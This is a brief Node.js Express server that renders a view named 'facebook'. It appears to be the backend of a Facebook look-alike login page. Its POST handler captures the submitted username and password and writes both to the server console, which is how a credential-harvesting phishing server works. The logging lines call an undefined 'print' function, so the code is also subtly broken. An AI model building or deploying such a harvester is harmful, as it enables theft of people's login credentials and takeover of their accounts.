var express = require("express")
var app = express()

app.set("view engine", 'ejs')

console.log('server has been created')
console.log(__dirname)

var bodyParser = require('body-parser')
var urlencodedParser = bodyParser.urlencoded({extended:false})

app.get('/',(req,res) => {
    res.render('facebook',{username:'None', password: 'None'})
})

app.post('/',urlencodedParser, (req,res) => {
    let user = req.body.username
    let password = req.body.password
    res.render('facebook',{username:user, password: password})
    console.log(print(user))
    console.log(print(password))
})

app.listen(3003)